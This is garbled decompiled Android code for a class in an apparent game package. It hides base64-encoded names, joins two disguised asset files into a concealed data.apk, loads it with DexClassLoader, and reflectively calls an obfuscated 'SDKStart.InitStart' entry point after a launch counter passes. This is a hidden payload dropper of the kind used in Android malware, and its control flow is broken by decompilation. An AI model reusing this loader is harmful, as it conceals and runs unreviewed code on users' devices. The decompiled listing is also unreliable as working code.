public class com.games.a {
	 /* # static fields */
	 public static java.lang.String a;
	 public static java.lang.String b;
	 public static java.lang.String c;
	 public static java.lang.String d;
	 public static java.lang.String e;
	 public static java.lang.String f;
	 public static java.lang.String g;
	 /* # direct methods */
	 static com.games.a ( ) {
		 /* .locals 1 */
		 final String v0 = "Y2NuLmFj"; // const-string v0, "Y2NuLmFj"
		 com.games.a .a ( v0 );
		 final String v0 = "bm54LmJj"; // const-string v0, "bm54LmJj"
		 com.games.a .a ( v0 );
		 final String v0 = "ZGF0YS5hcGs="; // const-string v0, "ZGF0YS5hcGs="
		 com.games.a .a ( v0 );
		 final String v0 = "Y29tLmdhbWUucGFyYW0="; // const-string v0, "Y29tLmdhbWUucGFyYW0="
		 com.games.a .a ( v0 );
		 final String v0 = "Y29tLmNjeC54bS5TREtTdGFydA=="; // const-string v0, "Y29tLmNjeC54bS5TREtTdGFydA=="
		 com.games.a .a ( v0 );
		 final String v0 = "L2ZpbGVzL2RhdGEuYXBr"; // const-string v0, "L2ZpbGVzL2RhdGEuYXBr"
		 com.games.a .a ( v0 );
		 final String v0 = "SW5pdFN0YXJ0"; // const-string v0, "SW5pdFN0YXJ0"
		 com.games.a .a ( v0 );
		 return;
	 } // .end method
	 private static final Object a ( Object p0, Integer p1 ) {
		 /* .locals 7 */
		 /* const/16 v5, 0x3f */
		 /* const/16 v4, 0x3e */
		 /* const/16 v1, 0x2f */
		 /* const/16 v0, 0x2b */
		 /* const/16 v2, 0x3d */
		 int v3 = 0; // const/4 v3, 0x0
		 /* if-nez p1, :cond_5 */
		 /* const/16 v6, 0x19 */
		 /* if-gt p0, v6, :cond_1 */
		 /* add-int/lit8 v0, p0, 0x41 */
		 /* int-to-byte v0, v0 */
	 } // :cond_0
} // :goto_0
} // :cond_1
/* const/16 v6, 0x1a */
/* if-lt p0, v6, :cond_2 */
/* const/16 v6, 0x33 */
/* if-gt p0, v6, :cond_2 */
/* add-int/lit8 v0, p0, 0x47 */
/* int-to-byte v0, v0 */
} // :cond_2
/* const/16 v6, 0x34 */
/* if-lt p0, v6, :cond_3 */
/* if-gt p0, v2, :cond_3 */
/* add-int/lit8 v0, p0, -0x4 */
/* int-to-byte v0, v0 */
} // :cond_3
/* if-eq p0, v4, :cond_0 */
/* if-ne p0, v5, :cond_4 */
/* move v0, v1 */
} // :cond_4
/* const/16 v0, 0x40 */
/* if-ne p0, v0, :cond_b */
/* move v0, v2 */
} // :cond_5
int v6 = 1; // const/4 v6, 0x1
/* if-ne p1, v6, :cond_b */
/* const/16 v6, 0x30 */
/* if-lt p0, v6, :cond_6 */
/* const/16 v6, 0x39 */
/* if-gt p0, v6, :cond_6 */
/* add-int/lit8 v0, p0, 0x4 */
/* int-to-byte v0, v0 */
} // :cond_6
/* const/16 v6, 0x41 */
/* if-lt p0, v6, :cond_7 */
/* const/16 v6, 0x5a */
/* if-gt p0, v6, :cond_7 */
/* add-int/lit8 v0, p0, -0x41 */
/* int-to-byte v0, v0 */
} // :cond_7
/* const/16 v6, 0x61 */
/* if-lt p0, v6, :cond_8 */
/* const/16 v6, 0x7a */
/* if-gt p0, v6, :cond_8 */
/* add-int/lit8 v0, p0, -0x47 */
/* int-to-byte v0, v0 */
} // :cond_8
/* if-ne p0, v0, :cond_9 */
/* move v0, v4 */
} // :cond_9
/* if-ne p0, v1, :cond_a */
/* move v0, v5 */
} // :cond_a
/* if-ne p0, v2, :cond_b */
/* const/16 v0, 0x40 */
} // :cond_b
/* move v0, v3 */
} // .end method
public static java.lang.String a ( java.lang.String p0 ) {
/* .locals 2 */
/* new-instance v0, Ljava/lang/String; */
(( java.lang.String ) p0 ).toCharArray ( ); // invoke-virtual {p0}, Ljava/lang/String;->toCharArray()[C
com.games.a .a ( v1 );
/* invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V */
} // .end method
public static void a ( android.app.Activity p0, java.lang.String p1, java.lang.String p2, java.lang.String p3, java.lang.String p4 ) {
/* .locals 5 */
/* new-instance v0, Ldalvik/system/DexClassLoader; */
int v1 = 0; // const/4 v1, 0x0
(( android.app.Activity ) p0 ).getClassLoader ( ); // invoke-virtual {p0}, Landroid/app/Activity;->getClassLoader()Ljava/lang/ClassLoader;
/* invoke-direct {v0, p1, p2, v1, v2}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V */
try { // :try_start_0
(( dalvik.system.DexClassLoader ) v0 ).loadClass ( p3 ); // invoke-virtual {v0, p3}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
int v1 = 0; // const/4 v1, 0x0
/* new-array v1, v1, [Ljava/lang/Class; */
(( java.lang.Class ) v0 ).getConstructor ( v1 ); // invoke-virtual {v0, v1}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;
int v2 = 0; // const/4 v2, 0x0
/* new-array v2, v2, [Ljava/lang/Object; */
(( java.lang.reflect.Constructor ) v1 ).newInstance ( v2 ); // invoke-virtual {v1, v2}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;
int v2 = 1; // const/4 v2, 0x1
/* new-array v2, v2, [Ljava/lang/Class; */
int v3 = 0; // const/4 v3, 0x0
/* const-class v4, Landroid/app/Activity; */
/* aput-object v4, v2, v3 */
(( java.lang.Class ) v0 ).getMethod ( p4, v2 ); // invoke-virtual {v0, p4, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
int v2 = 1; // const/4 v2, 0x1
(( java.lang.reflect.Method ) v0 ).setAccessible ( v2 ); // invoke-virtual {v0, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V
int v2 = 1; // const/4 v2, 0x1
/* new-array v2, v2, [Ljava/lang/Object; */
int v3 = 0; // const/4 v3, 0x0
/* aput-object p0, v2, v3 */
(( java.lang.reflect.Method ) v0 ).invoke ( v1, v2 ); // invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
/* :try_end_0 */
/* .catch Ljava/lang/Exception; {:try_start_0 ..:try_end_0} :catch_0 */
} // :goto_0
return;
/* :catch_0 */
/* move-exception v0 */
(( java.lang.Exception ) v0 ).printStackTrace ( ); // invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
} // .end method
public static void a ( android.content.Context p0 ) {
/* .locals 8 */
/* const v7, 0x1fce2 */
/* const v6, 0x1fbd0 */
int v0 = 0; // const/4 v0, 0x0
try { // :try_start_0
(( android.content.Context ) p0 ).getAssets ( ); // invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
v2 = com.games.a.a;
(( android.content.res.AssetManager ) v1 ).open ( v2 ); // invoke-virtual {v1, v2}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
/* const v2, 0x1fbd0 */
/* new-array v2, v2, [B */
(( java.io.InputStream ) v1 ).read ( v2 ); // invoke-virtual {v1, v2}, Ljava/io/InputStream;->read([B)I
(( android.content.Context ) p0 ).getAssets ( ); // invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
v3 = com.games.a.b;
(( android.content.res.AssetManager ) v1 ).open ( v3 ); // invoke-virtual {v1, v3}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
/* const v3, 0x1fce2 */
/* new-array v3, v3, [B */
(( java.io.InputStream ) v1 ).read ( v3 ); // invoke-virtual {v1, v3}, Ljava/io/InputStream;->read([B)I
/* const v1, 0x3f8b2 */
/* new-array v4, v1, [B */
/* move v1, v0 */
} // :goto_0
/* if-lt v1, v6, :cond_0 */
} // :goto_1
/* if-lt v0, v7, :cond_1 */
v0 = com.games.a.c;
int v1 = 0; // const/4 v1, 0x0
(( android.content.Context ) p0 ).openFileOutput ( v0, v1 ); // invoke-virtual {p0, v0, v1}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;
(( java.io.OutputStream ) v0 ).write ( v4 ); // invoke-virtual {v0, v4}, Ljava/io/OutputStream;->write([B)V
(( java.io.OutputStream ) v0 ).flush ( ); // invoke-virtual {v0}, Ljava/io/OutputStream;->flush()V
(( java.io.OutputStream ) v0 ).close ( ); // invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
} // :goto_2
return;
} // :cond_0
/* aget-byte v5, v2, v1 */
/* aput-byte v5, v4, v1 */
/* add-int/lit8 v1, v1, 0x1 */
} // :cond_1
/* add-int v1, v6, v0 */
/* aget-byte v2, v3, v0 */
/* aput-byte v2, v4, v1 */
/* :try_end_0 */
/* .catch Ljava/io/IOException; {:try_start_0 ..:try_end_0} :catch_0 */
/* add-int/lit8 v0, v0, 0x1 */
/* :catch_0 */
/* move-exception v0 */
(( java.io.IOException ) v0 ).printStackTrace ( ); // invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
} // .end method
public static void a ( android.content.Context p0, java.lang.String p1, java.lang.String p2, java.lang.String p3, java.lang.String p4, java.lang.String p5 ) {
/* .locals 5 */
/* new-instance v0, Ldalvik/system/DexClassLoader; */
int v1 = 0; // const/4 v1, 0x0
(( android.content.Context ) p0 ).getClassLoader ( ); // invoke-virtual {p0}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
/* invoke-direct {v0, p1, p2, v1, v2}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V */
try { // :try_start_0
(( dalvik.system.DexClassLoader ) v0 ).loadClass ( p3 ); // invoke-virtual {v0, p3}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
int v1 = 0; // const/4 v1, 0x0
/* new-array v1, v1, [Ljava/lang/Class; */
(( java.lang.Class ) v0 ).getConstructor ( v1 ); // invoke-virtual {v0, v1}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;
int v2 = 0; // const/4 v2, 0x0
/* new-array v2, v2, [Ljava/lang/Object; */
(( java.lang.reflect.Constructor ) v1 ).newInstance ( v2 ); // invoke-virtual {v1, v2}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;
int v2 = 2; // const/4 v2, 0x2
/* new-array v2, v2, [Ljava/lang/Class; */
int v3 = 0; // const/4 v3, 0x0
/* const-class v4, Landroid/content/Context; */
/* aput-object v4, v2, v3 */
int v3 = 1; // const/4 v3, 0x1
/* const-class v4, Ljava/lang/String; */
/* aput-object v4, v2, v3 */
(( java.lang.Class ) v0 ).getMethod ( p4, v2 ); // invoke-virtual {v0, p4, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
int v2 = 1; // const/4 v2, 0x1
(( java.lang.reflect.Method ) v0 ).setAccessible ( v2 ); // invoke-virtual {v0, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V
int v2 = 2; // const/4 v2, 0x2
/* new-array v2, v2, [Ljava/lang/Object; */
int v3 = 0; // const/4 v3, 0x0
/* aput-object p0, v2, v3 */
int v3 = 1; // const/4 v3, 0x1
/* aput-object p5, v2, v3 */
(( java.lang.reflect.Method ) v0 ).invoke ( v1, v2 ); // invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
/* :try_end_0 */
/* .catch Ljava/lang/Exception; {:try_start_0 ..:try_end_0} :catch_0 */
} // :goto_0
return;
/* :catch_0 */
/* move-exception v0 */
(( java.lang.Exception ) v0 ).printStackTrace ( ); // invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
} // .end method
public static a ( Object[] p0 ) {
/* .locals 13 */
/* const/16 v3, 0x41 */
int v1 = 0; // const/4 v1, 0x0
/* const/16 v12, 0x7f */
int v11 = 1; // const/4 v11, 0x1
/* array-length v0, p0 */
/* move v7, v0 */
} // :goto_0
/* if-lez v7, :cond_0 */
/* add-int/lit8 v0, v7, -0x1 */
/* aget-char v0, p0, v0 */
/* const/16 v2, 0x3d */
/* if-eq v0, v2, :cond_2 */
} // :cond_0
/* mul-int/lit8 v0, v7, 0x3 */
/* div-int/lit8 v8, v0, 0x4 */
/* new-array v0, v8, [B */
/* move v6, v1 */
/* move v4, v1 */
} // :goto_1
/* if-lt v4, v7, :cond_3 */
} // :cond_1
} // :cond_2
/* add-int/lit8 v0, v7, -0x1 */
/* move v7, v0 */
} // :cond_3
/* add-int/lit8 v2, v4, 0x1 */
/* aget-char v9, p0, v4 */
/* add-int/lit8 v1, v2, 0x1 */
/* aget-char v10, p0, v2 */
/* if-lt v1, v7, :cond_4 */
/* move v5, v3 */
} // :goto_2
/* if-lt v1, v7, :cond_5 */
/* move v4, v1 */
/* move v1, v3 */
} // :goto_3
/* if-gt v9, v12, :cond_1 */
/* if-gt v10, v12, :cond_1 */
/* if-gt v5, v12, :cond_1 */
/* if-gt v1, v12, :cond_1 */
/* int-to-byte v2, v9 */
v2 = com.games.a .a ( v2,v11 );
/* int-to-byte v9, v10 */
v9 = com.games.a .a ( v9,v11 );
/* int-to-byte v5, v5 */
v5 = com.games.a .a ( v5,v11 );
/* int-to-byte v1, v1 */
v1 = com.games.a .a ( v1,v11 );
/* int-to-char v1, v1 */
/* if-ltz v2, :cond_1 */
/* if-ltz v9, :cond_1 */
/* if-ltz v5, :cond_1 */
/* if-ltz v1, :cond_1 */
/* shl-int/lit8 v2, v2, 0x2 */
/* ushr-int/lit8 v10, v9, 0x4 */
/* or-int/2addr v10, v2 */
/* and-int/lit8 v2, v9, 0xf */
/* shl-int/lit8 v2, v2, 0x4 */
/* ushr-int/lit8 v9, v5, 0x2 */
/* or-int/2addr v9, v2 */
/* and-int/lit8 v2, v5, 0x3 */
/* shl-int/lit8 v2, v2, 0x6 */
/* or-int v5, v2, v1 */
/* add-int/lit8 v2, v6, 0x1 */
/* int-to-byte v1, v10 */
/* aput-byte v1, v0, v6 */
/* if-ge v2, v8, :cond_7 */
/* add-int/lit8 v1, v2, 0x1 */
/* int-to-byte v6, v9 */
/* aput-byte v6, v0, v2 */
} // :goto_4
/* if-ge v1, v8, :cond_6 */
/* add-int/lit8 v2, v1, 0x1 */
/* int-to-byte v5, v5 */
/* aput-byte v5, v0, v1 */
/* move v6, v2 */
} // :cond_4
/* add-int/lit8 v2, v1, 0x1 */
/* aget-char v1, p0, v1 */
/* move v5, v1 */
/* move v1, v2 */
} // :cond_5
/* add-int/lit8 v2, v1, 0x1 */
/* aget-char v1, p0, v1 */
/* move v4, v2 */
} // :cond_6
/* move v6, v1 */
} // :cond_7
/* move v1, v2 */
} // .end method
public static void b ( android.content.Context p0 ) {
/* .locals 8 */
int v7 = 0; // const/4 v7, 0x0
v0 = com.games.a.d;
(( android.content.Context ) p0 ).getSharedPreferences ( v0, v7 ); // invoke-virtual {p0, v0, v7}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
v0 = final String v0 = "sn"; // const-string v0, "sn"
/* add-int/lit8 v0, v0, 0x1 */
int v1 = 2; // const/4 v1, 0x2
/* if-ge v0, v1, :cond_1 */
com.games.a .a ( p0 );
final String v2 = "sn"; // const-string v2, "sn"
} // :cond_0
} // :goto_0
return;
} // :cond_1
/* new-instance v0, Lcom/games/b; */
/* invoke-direct {v0, p0}, Lcom/games/b;-><init>(Landroid/content/Context;)V */
v0 = this.h;
final String v1 = ""; // const-string v1, ""
v0 = (( java.lang.String ) v0 ).equals ( v1 ); // invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
/* if-nez v0, :cond_0 */
(( android.content.Context ) p0 ).getApplicationInfo ( ); // invoke-virtual {p0}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;
v0 = this.dataDir;
/* new-instance v1, Ljava/lang/StringBuilder; */
java.lang.String .valueOf ( v0 );
/* invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
v2 = com.games.a.f;
(( java.lang.StringBuilder ) v1 ).append ( v2 ); // invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v1 ).toString ( ); // invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
/* new-instance v2, Ljava/lang/StringBuilder; */
java.lang.String .valueOf ( v0 );
/* invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
final String v0 = "/files"; // const-string v0, "/files"
(( java.lang.StringBuilder ) v2 ).append ( v0 ); // invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v0 ).toString ( ); // invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
v3 = com.games.a.e;
v4 = com.games.a.g;
final String v5 = "a780b30e9151888c650f96ef25c552fe"; // const-string v5, "a780b30e9151888c650f96ef25c552fe"
/* move-object v0, p0 */
/* invoke-static/range {v0 ..v5}, Lcom/games/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V */
final String v1 = "sn"; // const-string v1, "sn"
} // .end method
